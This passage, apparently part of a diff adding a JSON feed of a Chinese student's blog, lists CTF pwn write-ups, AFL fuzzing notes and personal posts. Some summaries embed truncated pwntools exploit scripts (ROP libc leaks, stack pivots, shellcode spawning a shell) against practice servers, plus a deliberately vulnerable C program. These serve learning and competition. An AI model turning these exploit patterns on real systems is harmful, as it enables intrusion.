+      "summary": "题目做不出来，先来写这篇记录。 昨天把环境搭建好了，今天就拿来简单的进行一次测试。还是使用昨天的代码 #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <string.h> #include <signal.h> int vuln ( char * str) { int len = strlen(str); if (str[ 0 ] == 'A' && len == 66 ) { raise(SIGSEGV); //如果输入的字符串的首字符为A并且长度为66，则异常退出 } else if (str[ 0 ] == 'F' && len == 6 ) { raise(SIGSEGV); //如果输入的字符串的首字符为F并且长度为6，则异常退出 } else { printf( \"it is good! \\n \" ); } return 0 ; } int main ( int argc, char * argv[]) { char buf[ 100 ] = { 0 }; gets(buf); //存在栈溢出漏洞 printf(buf); //存在格式化字符串漏洞 vuln(buf); return 0 ; } 这个程序有栈溢出，格式化字符串漏洞，并且在输入两种特定格式的字符串时会异常退出，来试一下用 AFL 能不能找出这些漏洞。"
+    },
+    {
+      "title": "AFL学习记录（一）——安装、运行",
+      "url": "https://chujdk.github.io/fuzzing/1138.html",
+      "date": "2021-03-03",
+      "summary": "这是一个崭新的分类。学院为我们安排了科研导师，而我选择了研究安全方向的导师组，其实上个学期期中就选好了，但是由于各种原因当时没有直接开始学，到这个学期排课了才开始进行学习。"
+    },
+    {
+      "title": "XCTF-shell-WP",
+      "url": "https://chujdk.github.io/wp/1135.html",
+      "date": "2021-03-03",
+      "summary": "一道 8 分题，其实也没多难，就是思路很骚。我没想到，着实可惜。 读入全部使用 gets ，随便溢出。我们需要的是把 v16 置为 1，自然的思路是通过溢出实现，但是做不到，我们能溢出的全部在它下面，所以只能尝试通过 login 的验证。"
+    },
+    {
+      "title": "XCTF-nobug-WP",
+      "url": "https://chujdk.github.io/wp/1134.html",
+      "date": "2021-03-02",
+      "summary": "这道题的 exp 应该是近期写的最短的，但是却是最令我迷惑的题。 一开始就是一个输入，然后输入的字符串会被传到这个函数里面进行处理 这个函数非常的复杂，完全不知道它在做什么，我一度怀疑这是一道逆向题。然后了解到从它查表得行为和随便输入往往会转换出乱码俩个特征可以猜测这是一个 base64 加密，简单尝试一下就可以确认这一点。"
+    },
+    {
+      "title": "XCTF-onemanarmy-WP",
+      "url": "https://chujdk.github.io/wp/1131.html",
+      "date": "2021-03-01",
+      "summary": "这道题目还算简单，但是乍一看容易懵（反正我懵了）。 首先保护是全开的 分配这里非常的随意，但最多只能分配大小为 0x1FF 的 chunk，libc 版本为 2.27，虽然有提供 show 的功能"
+    },
+    {
+      "title": "XCTF-Noleak-WP",
+      "url": "https://chujdk.github.io/wp/1123.html",
+      "date": "2021-02-28",
+      "summary": "HCTF-game 终于是结束了，我也没有借口再不做题了，所以从今天开始还是要继续每天一题（ 尽量吧 ）。 这道题目比较麻烦，是我做过的和堆相关的最麻烦的一道题。前前后后加起来大概做了将近两个小时，从下题到交 flag 总共将近十个小时，主要是中间被一些事情耽搁了。这里也真的是要发发牢骚，大学里面总是会有一些莫名其妙的破事和破人，今天就碰到了，非常的不爽，都是成年人了还有人要管别人对待破事的“态度”，真的是无法理解。"
+    },
+    {
+      "title": "HGAME2021-WEEK4-PWN-WP",
+      "url": "https://chujdk.github.io/wp/1108.html",
+      "date": "2021-02-28",
+      "summary": "hgame 也差不多结束了，第四周只做了 pwn，别的方向都不太会。pwn 的题还是比较简单的。 house_of_cosmos 漏洞点看了很久才看出来 读入函数这里的 i 是 unsigned int ，所以当 a2 <= 0 时，就可以输入几乎无限的字符，轻松实现堆溢出。由于没有提供 show 的功能，像前两周那样通过 Unsorted Bin 来 leak 的方法就比较难了。但是既然可以堆溢出，又有指向堆块的指针，我们就可以朴素地用 unlink 来实现利用。"
+    },
+    {
+      "title": "HCTF-game 赛后总结",
+      "url": "https://chujdk.github.io/pwnreview/1116.html",
+      "date": "2021-02-27",
+      "summary": "这个寒假主要做的事就是打 HCTF-game，毕竟在竞赛方面，并没有准备后路，如果这场比赛出现失误，基本就与竞赛无缘了，这个后果大概是我无法担当的，所以比赛期间的压力还是比较大的。最后的结果也还算可以接受，至少 PWN 是 AK 掉了的，也有几个前三血。比较遗憾的大概就是别的方向解出的题目不多，特别是 web，几乎是爆零了。这也导致了我的总分不够靠前。说实话 PWN 的总分并不是很高，特别是最后一周只有两道题，和 web 还是差了不少，客观来说还是有一定的劣势的。就我之前学习的学习而言，这种多方向都有要求的比赛其实还是不太适合。"
+    },
+    {
+      "title": "对大一上的总结",
+      "url": "https://chujdk.github.io/mess/1115.html",
+      "date": "2021-02-25",
+      "summary": "寒假就快要结束了，我的大一上也算是彻底结束了。这篇文章简单地总结一下。 上学期做的事，总得来说有这几点 基本确定了未来发展的方向 维护了自己的博客 文化课上没有落下太多 发展的方向 高考考的很不理想，也是失落了一段时间，到杭电读书其实也是有点小小的遗憾的。我校虽然就业情况十分乐观，但是挺难拿到高端岗位，职业寿命就无法得到保障。为了避免 35 岁被企业无情地优化掉，摆在面前似乎只有两条路，一是科研，二是竞赛。我的心气还是比较高的，即使在杭电，也希望能够在某些方面超过 985 的学生。就我校而言，由于各种原因，科研实力确实比不过 985 211 双一流高校，然而竞赛上面还是可以和这些学校竞争的。于是我决定要在一门竞赛上搞出成绩，也算是安慰、证明一下自己并不比 985 的学生差。高中的时候我搞过信息学竞赛，还算有点基础，按说 ACM 应该是最好的选择，但是我这个人是兴趣驱动的，不爱做的事情是肯定做不好的。两年多的 OI 生涯，学到的不是多少算法，而是明白了自己其实不喜欢研究算法。于是我在 10 月份的时候彻底与 ACM 断了关系，全面投入对 CTF-PWN 的学习当中。这个决定还是明智的，事实证明我确实是对计算机底层实现原理感兴趣，客观的来说 PWN 的学习门槛是很高的，许多利用方式在理解前看来都 与魔法无异 ，但是我还是比较享受这个学习过程的。"
+    },
+    {
+      "title": "HGAME-WEEK3-WP",
+      "url": "https://chujdk.github.io/wp/1100.html",
+      "date": "2021-02-21",
+      "summary": "pwn blackgive 栈迁移，不要想复杂了 exp #!/usr/bin/env python # coding=utf-8 from pwn import * context(log_level = 'debug' ) context . terminal = [ 'tmux' , 'splitw' , '-h' ] sh = process( \"./blackgive\" ) #sh = remote(\"\") libc = ELF( \"./libc6_2.27-3ubuntu1.4_amd64.so\" ) elf = ELF( \"./blackgive\" ) pop_rdi_ret = 0x400813 bss_base = 0x6010A0 off = 0xA0 payload = 'paSsw0rd' . ljust( 0x20 , ' \\x00 ' ) payload += p64(bss_base + off - 0x8 ) + p64( 0x4007A3 ) sh . recvuntil( \"password:\" ) #gdb.attach(proc.pidof(sh)[0]) sh . send(payload) payload = ' \\x00 ' * off + p64(pop_rdi_ret) + p64(elf . got[ 'puts' ]) + p64(elf . sym[ 'puts' ]) + p64( 0x40070a ) sh . sendlineafter( \"! \\n \" ,payload) puts_addr = u64(sh . recvuntil( ' \\n ' ,drop = True ) . ljust( 8 , ' \\x00 ' )) libc_base = puts_addr - libc . sym[ 'puts'"
+    },
+    {
+      "title": "如何利用Unsorted Bin泄露Libc基地址",
+      "url": "https://chujdk.github.io/pwnreview/1089.html",
+      "date": "2021-02-16",
+      "summary": "这其实是一个很简单很枯燥的问题，许多题中都会用到，但是我发现好像并没有文章以该方法为主角介绍该方法，也没有对其原理做出详细解释。估计是大佬们都觉得这个问题太简单了不愿意费时间来写，而回想过去，做题时总是会记得有这样一个利用方法，但是却找不到具体的利用原理。所以我就来细讲一下这个问题。"
+    },
+    {
+      "title": "HGAME2021-WEEK3-PWN-WP",
+      "url": "https://chujdk.github.io/wp/1090.html",
+      "date": "2021-02-16",
+      "summary": "blackgive 栈迁移 exp #!/usr/bin/env python # coding=utf-8 from pwn import * context(log_level = 'debug' ) context . terminal = [ 'tmux' , 'splitw' , '-h' ] sh = process( \"./blackgive\" ) #sh = remote(\"\") libc = ELF( \"./libc6_2.27-3ubuntu1.4_amd64.so\" ) elf = ELF( \"./blackgive\" ) pop_rdi_ret = 0x400813 bss_base = 0x6010A0 off = 0xA0 payload = 'paSsw0rd' . ljust( 0x20 , ' \\x00 ' ) payload += p64(bss_base + off - 0x8 ) + p64( 0x4007A3 ) sh . recvuntil( \"password:\" ) #gdb.attach(proc.pidof(sh)[0]) sh . send(payload) payload = ' \\x00 ' * off + p64(pop_rdi_ret) + p64(elf . got[ 'puts' ]) + p64(elf . sym[ 'puts' ]) + p64( 0x40070a ) sh . sendlineafter( \"! \\n \" ,payload) puts_addr = u64(sh . recvuntil( ' \\n ' ,drop = True ) . ljust( 8 , ' \\x00 ' )) libc_base = puts_addr - libc . sym[ 'puts' ] payload "
+    },
+    {
+      "title": "HGAME-WEEK2-WP",
+      "url": "https://chujdk.github.io/wp/1078.html",
+      "date": "2021-02-14",
+      "summary": "RE fake_debugger beta 没搞懂，不同位置的不同字符对应的编码都不同，没什么思路，写了个脚本爆破了 #!/usr/bin/env python # coding=utf-8 from pwn import * #context(log_level = 'debug') total_char = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_=+|/?.>,<:; \\\"\\'\\\\ `~!@#$%^&*() {} []' def test (flag_now): sh = remote( \"101.132.177.131\" , 9999 ) payload = flag_now sh . sendlineafter( \"now! \\n \" ,payload) for i in range ( 2 * len (flag_now)): sh . sendlineafter( \"--- \\n \" , ' ' ) sh . recvuntil( 'eax: ' ) code = int (sh . recvuntil( \" \\n \" )) sh . close() return code def get_next (flag_now): sh = remote( \"101.132.177.131\" , 9999 ) payload = flag_now + 'a' sh . sendlineafter( \"now! \\n \" ,payload) for i in range ( 2 * len (flag_now) + 2 ): sh . sendlineafter( \"--- \\n \" , ' ' ) sh . recvuntil( 'ebx: ' ) code = int (sh "
+    },
+    {
+      "title": "HGAME2021-WEEK2-PWN-WP",
+      "url": "https://chujdk.github.io/wp/1079.html",
+      "date": "2021-02-09",
+      "summary": "rop_primary 没什么难度，就是单纯的 ROP #!/usr/bin/env python # coding=utf-8 from pwn import * from LibcSearcher import * import re elf = ELF( \"./rop_primary\" ) pop_rdi_ret = 0x401613 pop_rsi_r15_ret = 0x401611 pop_r14_r15_ret = 0x401610 def matrixMul (A, B): if len (A[ 0 ]) == len (B): res = [[ 0 ] * len (B[ 0 ]) for i in range ( len (A))] for i in range ( len (A)): for j in range ( len (B[ 0 ])): for k in range ( len (B)): res[i][j] += int (A[i][k]) * int (B[k][j]) return res sh = remote( \"159.75.104.107\" , 30372 ) sh . recvuntil( \"A: \\n \" ) matA = [] matB = [] while 1 : number_string = sh . recvuntil( \" \\n \" ,drop = True ) if (number_string == 'B:' ): break matA . append(re . findall( r \"\\d+\\.?\\d*\" ,number_string)) while 1 : number_string = sh . recvuntil( \" \\n \" ,drop = True ) if (number_string =="
+    },
+    {
+      "title": "关于/proc目录",
+      "url": "https://chujdk.github.io/pwnreview/1070.html",
+      "date": "2021-02-09",
+      "summary": "/proc 这个目录很牛，充满了信息 /proc 应该说是 Linux 一切皆文件的设计哲学的体现，其中的文件和目录本身都是虚拟的一个文件系统，提供理一些内核信息。里面的有些文件很有些用处，这里简单列举一下"
+    },
+    {
+      "title": "HGAME2021-WEAK1-WP",
+      "url": "https://chujdk.github.io/wp/1044.html",
+      "date": "2021-02-07",
+      "summary": "许久没有更新博客了，主要是因为最近都在打 hgame ，客观来讲题挺难的，别的方向的题没做过，就真的是都不会。这篇博客是 week1 中我解出来的题目的 wp 的合集。bin 的题是都解出来了，别的方向大概也就做了做签到，应该说是真的不会，最后的总分是真的不怎么好看，pwn手心里苦啊。"
+    },
+    {
+      "title": "BUU-starctf_2019_quicksort-WP",
+      "url": "https://chujdk.github.io/wp/1040.html",
+      "date": "2021-01-29",
+      "summary": "不知不觉就在factorio中颓了一天，`所以就做了这么一道不能算难的题目。 这里s可以把ptr溢出掉实现任意地址写。注意gets是读到 '\\n' 为止的， '\\x00' 并不会使它停止读入。"
+    },
+    {
+      "title": "xctf-EasyPwn-WP",
+      "url": "https://chujdk.github.io/wp/1037.html",
+      "date": "2021-01-28",
+      "summary": "很久没做xctf的题了，这道题其实不难，但是漏洞点不容易看出来（菜如我就没看出来） 这里的 v2 其实是有溢出的， v2 的大小仅有 0x3EB ， s 的大小却有 0x400 ，这样就可以覆写v3，而C的格式化字符串家族的函数对于格式化字符串的处理都是传入字符串头指针，向后遍历到 '\\x00' 为止的，所以我们在 %s 后面接上格式化字符串也是有效的，又由于是栈上格式化字符串，可以容易地实现任意地址读写。比较麻烦的是参数位置的计算，本题中我还不知道该怎么算，就只能用老办法试了（也就是 %p 打出值在gdb里面看stack比对，发现不是与rsp距离+6而是+4）。"
+    },
+    {
+      "title": "BUU-SWPUCTF_2019_login-WP",
+      "url": "https://chujdk.github.io/wp/1035.html",
+      "date": "2021-01-27",
+      "summary": "本来想改返回地址的，但是发现不论是 one_gadget 还是 system 都出现了 dump core ，据说是32位程序这样改返回地址很容易爆，我也不知道为什么。最后还是覆写的 printf@got 。"
+    },
+    {
+      "title": "BUU-wustctf2020_easyfast-WP",
+      "url": "https://chujdk.github.io/wp/1034.html",
+      "date": "2021-01-27",
+      "summary": "fastbin attack水题，大概是 House Of Spirit 存在UAF,所以也不需要double free了，申请两个chunk，free掉他们，由于fastbin的LIFO策略，修改第二个chunk的fd指针为0x602080，然后malloc两次就可以对0x602090任意写。当然由于fastbin在分配时会检测被分配的chunk的 size 的正确性"
+    },
+    {
+      "title": "BUU-gyctf_2020_force-WP",
+      "url": "https://chujdk.github.io/wp/1033.html",
+      "date": "2021-01-27",
+      "summary": "报以复习的形态做了一下这道HOF裸题，结果还是学到了新知识，蛮好蛮好 HOF不想多说了，毕竟是挺简单的一种利用， 此题 中有谈及。 leak 每一个chunk的地址都是直接告诉我们的，但是程序可以说没有输出功能，通过以往的办法leak libc base不甚容易，但是我们可以利用mmap的chunk的特性来获取libc base，申请一个较大的chunk，此时由于top chunk等处都无法分配，就会通过mmap映射内存来分配，而内存的地址和libc的基地址的偏移是固定的，所以我们就可以调试获取偏移并算出libc base"
+    },
+    {
+      "title": "BUU-wdb_2018_3rd_soEasy-WP",
+      "url": "https://chujdk.github.io/wp/1029.html",
+      "date": "2021-01-26",
+      "summary": "名字都取成这样了，也不想说什么了 #!/usr/bin/env python # coding=utf-8 from pwn import * context(log_level = 'debug' ,arch = 'i386' ,os = 'linux' ) #sh = process(\"./wdb_2018_3rd_soEasy\") sh = remote( \"node3.buuoj.cn\" , 29310 ) sh . recvuntil( \"->\" ) addr = int (sh . recvuntil( \" \\n \" ),base = 16 ) payload = asm(shellcraft . sh()) sh . sendlineafter( \"do? \\n \" ,payload . ljust( 0x48 + 4 , 'a' ) + p32(addr)) sh . interactive()"
+    },
+    {
+      "title": "BUU-[BJDCTF 2nd]rci-WP",
+      "url": "https://chujdk.github.io/wp/1028.html",
+      "date": "2021-01-25",
+      "summary": "头图变成上篇文章的了，不知道为什么 Linux操作题，也不需要写什么脚本 程序很容易看，流程就是有一次ls的机会，第二次需要输入当前的目录，然后就有第二次 system 的机会，这里就可以调出shell。"
+    },
+    {
+      "title": "BUU-picoctf_2018_leak_me-WP",
+      "url": "https://chujdk.github.io/wp/1023.html",
+      "date": "2021-01-24",
+      "summary": "这道题没什么难度，IDA没办法反编译，没办法，就硬看呗 有这个后门,需要我们输入一个正确的密码才可以执行，密码会先被读到内存中。 而我们会输入自己的名字，可以输入0x100个字节"
+    },
+    {
+      "title": "BUU-[极客大挑战 2019]Not Bad-WP",
+      "url": "https://chujdk.github.io/wp/1019.html",
+      "date": "2021-01-24",
+      "summary": "这题其实挺简单的，但是我还是没做出来:( 新的观点 原来在对于没开NX的题目可以考虑用 jmp rsp 的gadget啊！学到了。题目中有这个gadget，所以我们不需要leak栈地址就可以直接执行我们的shellcode。当然这里的shellcode只能写0x28个字节，并且 seccomp 禁用了除 read,wirte,open,exit 之外的所有系统调用，长度是不够的，所以考虑在mmap的内存上写并执行"
+    },
+    {
+      "title": "BUU-bcloud_bctf_2016-WP",
+      "url": "https://chujdk.github.io/wp/1018.html",
+      "date": "2021-01-23",
+      "summary": "发牢骚 考试周是真的烦，快一个星期没有碰pwn，做本题时的体验很差 知识点 本题是House Of系列中的House Of Force，也是我第一次接触House系列。总的来说HOF还是比较容易理解的，但是其条件比较苛刻。"
+    },
+    {
+      "title": "BUU-inndy_echo3-WP",
+      "url": "https://chujdk.github.io/wp/1012.html",
+      "date": "2021-01-16",
+      "summary": "虽然马上就要期末考了，我应该好好复习数分，但是还是没忍住，花了不少时间pwn了这题。 这是我做过的最麻烦的fmt，知识并没有新增，还是“搭跳板”，但是由于要爆破，之前就一直没做，今天突然想起来，莫名其妙的胸有成竹了起来，就试着pwn了一下"
+    },
+    {
+      "title": "第一个一百！！！",
+      "url": "https://chujdk.github.io/mess/1006.html",
+      "date": "2021-01-15",
+      "summary": "看着九十九这个数字想了一会儿，惊觉博客居然要有一百篇文章了，既然如此这第一百篇就胡扯一气吧。 缘起 高考失利，不过最后进入的学校和专业还是相对满意（学校虽然偏科严重但是和我关系不大），第一个月基本上就是日日水过，期间考虑过我到底想要什么，高中算是打过OI，没花多少时间是真的，基本就是我打游戏的一个掩护（否则想想高中期间可能真的没得电脑玩），但是也不是真的什么都没学到，可以说基础算法都系统的学过了。我校的ACM实力确实是很强，我把自己当作零基础的来练，也是可能夺个区域赛Ag什么的。而且以我的OI经历，也算是超出零基础不少（其实我到现在还不能肯定当时我到底算不算进入了集训队，不过也是过去的事情了，就当是进了吧，反正也没什么关系了），班里也有大佬可以给我帮助，也许真的可能能成。然而我是一个非常兴趣驱动的人，如果有得选，没兴趣的事情我是死都不会选的，管他有多少好处，在打了几场CF和仔细审视了自己刷不进去题目的事实后，我彻底明白了我事实上并不喜欢算法。"
+    },
+    {
+      "title": "BUU-metasequoia_2020_blacksmith-WP",
+      "url": "https://chujdk.github.io/wp/1005.html",
+      "date": "2021-01-14",
+      "summary": "整数溢出， size_t 是一个不小压力机器字长的无符号整型，然鹅判断长度的时候 这里用的是 signed int ，所以我们输入一个负数就可以轻松栈溢出了"
+    },
+    {
+      "title": "BUU-picoctf_2018_buffer overflow 0-WP",
+      "url": "https://chujdk.github.io/wp/1001.html",
+      "date": "2021-01-12",
+      "summary": "今天好像都是水题嘛。不过这题使用ssh连接直接给了一个没root权限的shell 不过有一个vuln，就是题目给出的elf。 payload很好写，就是 payload = \"./vuln \" + 'a' * 0x18 + p32(elf.plt[\"puts\"]) + 'reta' + p32(0x804A080) ，这个输进去就可以了，然后我发现 pwntools 输不进去，蛮奇怪的。向大佬请教之后后来才知道是用法错了，文档里面是这样写的"
+    },
+    {
+      "title": "BUU-cmcc_pwnme1-WP",
+      "url": "https://chujdk.github.io/wp/999.html",
+      "date": "2021-01-12",
+      "summary": "完成任务很开心。栈溢出水题，没什么可说的，直接exp吧 #!/usr/bin/env python # coding=utf-8 from pwn import * sh = remote( \"node3.buuoj.cn\" , 29136 ) elf = ELF( \"./pwnme1\" ) libc = ELF( \"./libcs/buu-32-libc.so\" ) pop_ebp_ret = 0x80485f3 payload = 'a' * 0xA4 + 'b' * 0x4 + p32(elf . symbols[ \"puts\" ]) + p32(pop_ebp_ret) + p32(elf . got[ \"puts\" ]) payload += p32( 0x8048570 ) sh . sendlineafter( \"Exit \\n \" , '5' ) sh . sendlineafter( \"fruit:\" ,payload) sh . recvuntil( \".. \\n \" ) puts_addr = u32(sh . recv( 4 )) base = puts_addr - libc . symbols[ \"puts\" ] print hex (base) payload = 'a' * 0xA4 + 'b' * 0x4 + p32(base + libc . symbols[ \"system\" ]) + 'a' * 4 + p32(base + libc . search( \"/bin/sh\" ) . next()) sh . sendlineafter( \"Exit \\n \" , '5' ) sh . sendlineafter( \"fruit:\" ,payload) sh . interactive() 题目给了后门，但是buu上后门没法用，所以就老"
+    },
+    {
+      "title": "BUU-inndy_onepunch-WP",
+      "url": "https://chujdk.github.io/wp/997.html",
+      "date": "2021-01-11",
+      "summary": "哈哈这道题其实没什么可说的，一看只有一次修改一个字节的机会，自然没什么思路 但是此题代码段可修改，所以我们修改一个 jmp short 指令就可以让程序再次跳转到 scanf 处了，这样就轻松地实现了多次利用。然后用同样地方法把 shellcode 写入并执行就可以 get shell 了。（关于 jmp short 指令我曾经简单的在 这篇文章 中记录过）"
+    },
+    {
+      "title": "BUU-starctf_2019_babyshell-WP",
+      "url": "https://chujdk.github.io/wp/994.html",
+      "date": "2021-01-09",
+      "summary": "这道题目很有意思，我很喜欢 分析 流程很简单 这里读入一段，然后 进入这样一个判断，做的事就是对我们输入的串中的每个字母在 这个字符串里找匹配，如果每个都能匹配到，就执行我们输入的字符串（shellcode）。之前我也做的过类似的 题目 ，那道是可见字符shellcode，比这道题要求松一些，也有现成的工具。遗憾的是，本题没有工具生成，不会，看wp。"
+    },
+    {
+      "title": "BUU-starctf2018_babystack-WP",
+      "url": "https://chujdk.github.io/wp/985.html",
+      "date": "2021-01-09",
+      "summary": "这道题是碰到知识盲区了 写在前面 这篇wp还不完善，之后再慢慢补全 漏洞点 非常明显的一个栈溢出，而且可以溢出非常多。当然，由于开了 canary ，我就没思路了，毕竟确实没有得leak。不过呢这个函数是开了一个新的线程调用的，我当然是想到了和这个有关系的，于是就去查了一下条件竞争的利用，发现看不懂，而且好像也和这道题目没有什么关系。遂看wp。"
+    },
+    {
+      "title": "很开心的一件事",
+      "url": "https://chujdk.github.io/mess/981.html",
+      "date": "2021-01-09",
+      "summary": "最近其实是有点难受的，感觉题目都太难了，先是没思路，看了wp还复现不出来。不过让我很开心的一件事是一篇发在看雪的wp被评为了优秀 说实话这道题就是简单的堆上格式化字符串，wp也没写的多好，但是能被评为优秀真的让人很开心。"
+    },
+    {
+      "title": "KCTF-前世今生（PWN）/ASIS CTF Finals 2016 Heapstorm-WP",
+      "url": "https://chujdk.github.io/wp/979.html",
+      "date": "2021-01-07",
+      "summary": "最近为了学习 _IO_FILE 这一类的利用，在尝试阅读 scanf 的源码，想找一点参考资料，就到看雪论坛上面看了看，资料没找到反而是发现看雪也有自己的题库，于是就找了这道难度分最低的题目试了试水。 原题地址"
+    },
+    {
+      "title": "BUU-pwnable_simple_login/XCTF-formate2-WP",
+      "url": "https://chujdk.github.io/wp/970.html",
+      "date": "2021-01-06",
+      "summary": "很简单的一个栈溢出，本来还以为真的是什么高级密码学 这里有一个栈溢出。虽然只溢出了四个字节，但是由于input在bss段，其地址已知，我们可以考虑通过leave栈迁移至input。由于题目给出了后面函数，我们直接ret到那里去就可以了。"
+    },
+    {
+      "title": "BUU-warmup(PWN)-WP",
+      "url": "https://chujdk.github.io/wp/964.html",
+      "date": "2021-01-06",
+      "summary": "这道题做的特别难受，也浪费了很多时间，确实是状态太差了。最近有一点小失意，发现好像什么题都不会做了。 这道题就是一个简单的ret2syscall，直接看exp吧"
+    },
+    {
+      "title": "BUU-picoctf_2018_echooo-WP",
+      "url": "https://chujdk.github.io/wp/966.html",
+      "date": "2021-01-05",
+      "summary": "其实这题之前还做了一道，但是有点晚了，而且做这俩题浪费了很多时间，有点不高兴，那个的wp就明天再说吧 没什么可说的,偏移是8，nc上去 %8$s 就可以了"
+    },
+    {
+      "title": "XCTF-250-WP",
+      "url": "https://chujdk.github.io/wp/960.html",
+      "date": "2021-01-04",
+      "summary": "这个 print ，不仔细看怎么看的出来！（这个v4我愚蠢地以为是识别错误）浪费我半个小时想到底怎么用fmt利用！更可气的是xctf上还没什么人做，让我以为很难，又是什么我没学过的高级利用，点开 print 一看，好嘛，就是这么简单枯燥的一个栈溢出！"
+    },
+    {
+      "title": "XCTF-echo_back2-WP",
+      "url": "https://chujdk.github.io/wp/952.html",
+      "date": "2021-01-04",
+      "summary": "写在前面 由于我本地的环境和服务器完全不一样，所以这道题其实我完全没法做，看着wp云pwn了一下也算是学了一下scanf的部分实现了。 可见在本机，覆盖stdin的_IO_buf_base最低字节为0的话，是达不到修改_IO_buf_base的效果的。其实我已经用patchelf替换了libc，但是还是无法还原靶机。打算是之后搭建一套docker环境尽量还原靶机来对这类题进行动调。"
+    },
+    {
+      "title": "XCTF-Aul-WP",
+      "url": "https://chujdk.github.io/wp/938.html",
+      "date": "2021-01-02",
+      "summary": "蛮好玩的一道题 一看附件暂无，抱着怀疑的心态nc了一下 进行了三次尝试后终于有光了，输入help试一下 发现输出了一堆奇怪的东西，说实话我就看懂了一个lua，回想起之前做过的 XCTF-monkey-WP ，我猜他是一个lua解释器，于是信息搜集了一下，得知 os.execute ([command]) 就可以实现类似C中system函数的功能。考虑尝试一下"
+    },
+    {
+      "title": "XCTF/BUU/pwnable-dubblesort-WP",
+      "url": "https://chujdk.github.io/wp/919.html",
+      "date": "2021-01-02",
+      "summary": "灵感 故事是这样的，拿到题目放到ida里分析，发现是个冒泡，同时数组可以随便越界，又给了libc，感觉挺熟悉的，应该可切，然后到虚拟机里checksec,发现一片绿"
+    },
+    {
+      "title": "XCTF-1000levevls-WP",
+      "url": "https://chujdk.github.io/wp/903.html",
+      "date": "2021-01-01",
+      "summary": "一些废话 这道题目有一种更具普遍性的解法（xctf提供）即部分leak system然后爆破，但是这样的几率非常低（大约万分之一），大体是通过修改rbp实现leak system的四个字节（前提是发现ida的一个识别错误），处理起来非常的麻烦，可以说很难想出这个解法。当然我是什么解法都不会的，从网络上的wp中发现了非常容易实现的利用方法，但是在大多数机器上都无法实现利用，而xctf的靶机恰巧不属于这大多数"
+    },
+    {
+      "title": "XCTF/BUU-babyfengshui-WP",
+      "url": "https://chujdk.github.io/wp/895.html",
+      "date": "2021-01-01",
+      "summary": "XCTF总是给出一个错误的libc，让我对无法get shell百思不得其解，真是不友好，以后统一用LibcSearcher解决libc的问题吧。 这道题其实挺简单的，但是我还是做了很久，主要是没理解对输入长度的判断。"
+    },
+    {
+      "title": "从wordpress迁移到typecho",
+      "url": "https://chujdk.github.io/mess/888.html",
+      "date": "2020-12-31",
+      "summary": "以前一直用的是wordpress，主题是atom，一款很优秀的主题，但是其设置我一直搞不太懂（毕竟是免费主题，作者愿意开源出来就很感激了），导致我的博客一直都是实际上只有一张页面，非常简陋。偶然看到这个handsome主题，确实是非常的炫酷，当时就让我心动了，可惜的是作者只开发了typecho下的这款主题，本来不是特别想折腾框架什么的，毕竟确实是特别的累，又已经积累了80来篇文章，也怕出意外，结果昨天下午本来要做的报告突然取消掉了，于是就动了折腾这一下的打算，结果发现还是非常顺利的，这篇文章就记录一下我的转移过程"
+    },
+    {
+      "title": "XCTF-HMI流水灯运行-WP",
+      "url": "https://chujdk.github.io/wp/xctf-hmi%E6%B5%81%E6%B0%B4%E7%81%AF%E8%BF%90%E8%A1%8C-wp.html",
+      "date": "2020-12-30",
+      "summary": "这道题目挺有点意思，也让我知道了工控安全在ctf是怎么体现的。 其实很简单 就是这样的一个栈溢出而已，几乎没有保护，我们可以为所欲为。但是需要特殊处理，程序一直在跑流水灯"
+    },
+    {
+      "title": "BUU-qctf_2018_stack2-WP",
+      "url": "https://chujdk.github.io/wp/buu-qctf_2018_stack2-wp.html",
+      "date": "2020-12-29",
+      "summary": "这道题是很明显的数组越界的漏洞，题目也给出了后门\"hackhere\"。于是自然的我考虑通过越界覆写return address实现ret2text。然后奇怪的没有任何作用。于是我看了一下退出时的行为"
+    },
+    {
+      "title": "XCTF-easyfmt-WP",
+      "url": "https://chujdk.github.io/wp/xctf-easyfmt-wp.html",
+      "date": "2020-12-29",
+      "summary": "easy是easy，但是特别麻烦。 简单的四步。 checkin没什么好办法，老老实实爆破，概率0.2，'0'-'4'都有可能"
+    },
+    {
+      "title": "BUU-actf_2019_babystack-WP",
+      "url": "https://chujdk.github.io/wp/buu-actf_2019_babystack-wp.html",
+      "date": "2020-12-29",
+      "summary": "一道简单的通过leave栈迁移实现更长的rop链的题 #!/usr/bin/env python # coding=utf-8 from pwn import * from LibcSearcher import * pop_rdi_ret = 0x400ad3 context(log_level = 'debug') sh = remote(\"node3.buuoj.cn\",\"28568\") #sh = process(\"./ACTF_2019_babystack\") elf = ELF(\"./ACTF_2019_babystack\") libc = ELF(\"./buu-libc-2.23.so\") sh.sendlineafter(\"e?\\n>\",str(0xE0)) sh.recvuntil(\"at \") stackaddr = int(sh.recvuntil(\"\\n\",drop = True),base = 16) payload = 'fillfill' + p64(pop_rdi_ret) + p64(elf.got[\"puts\"]) payload += p64(elf.symbols[\"puts\"]) + p64(0x400800) payload = payload.ljust(0xD0,'a') payload += p64(stackaddr) + p64(0x400A18) sh.sendafter('>',payload) sh.recvuntil(\"e~\\n\") puts_addr = u64(sh.recvuntil('\\n',drop = True).ljust(8,'\\x00')) LIBC = LibcSearcher('puts',puts_addr) base = puts_addr - LIBC.dump('puts') pri"
+    },
+    {
+      "title": "两个模型",
+      "url": "https://chujdk.github.io/mess/%E4%B8%A4%E4%B8%AA%E6%A8%A1%E5%9E%8B.html",
+      "date": "2020-12-28",
+      "summary": "博客基本上都是记录pwn的学习，这样不是很好，想想还是记录记录生活，最近这两天做了两个挺有意思的模型 不知道是什么的飞艇 X翼 可以说是浪费了时间，但也可以说挺有意义的，星战也是陪我度过了初中那段时间的，谈不上热爱，但也能说挺喜欢的，拼的时候还是挺开心的。"
+    },
+    {
+      "title": "BUU-actf_2019_babyheap-WP",
+      "url": "https://chujdk.github.io/wp/buu-actf_2019_babyheap-wp.html",
+      "date": "2020-12-28",
